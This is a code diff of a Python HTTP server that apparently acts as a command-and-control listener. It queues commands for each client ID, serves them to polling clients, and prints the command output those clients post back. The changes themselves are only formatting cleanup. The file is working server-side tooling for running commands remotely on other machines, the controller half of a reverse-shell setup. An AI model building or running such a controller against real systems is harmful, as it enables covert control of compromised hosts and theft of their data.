@@ -1,5 +1,5 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import threading
+
 
 class HTTPCommandHandler(BaseHTTPRequestHandler):
     cmd_queue = {}
@@ -14,16 +14,16 @@ class HTTPCommandHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(cmd.encode("utf-8"))
             if cmd:
-                self.cmd_queue[client_id] = "" # Clear sent command
+                self.cmd_queue[client_id] = ""  # Clear sent command
         else:
             self.send_response(404)
             self.end_headers()
 
     def do_POST(self):
-         # /output/{ID} -> Output receiving
+        # /output/{ID} -> Output receiving
         if self.path.startswith("/output/"):
             client_id = self.path.split("/")[-1]
-            length = int(self.headers['Content-Length'])
+            length = int(self.headers["Content-Length"])
             output = self.rfile.read(length).decode("utf-8")
             print(f"\n[{client_id}] Output:\n{output}")
             self.send_response(200)
@@ -32,10 +32,12 @@ class HTTPCommandHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
+
 def start_http_listener(host, port):
     server = HTTPServer((host, port), HTTPCommandHandler)
     print(f"[*] HTTP Server listening on {host}:{port}")
     server.serve_forever()
+
 
 if __name__ == "__main__":
     # Standalone test için
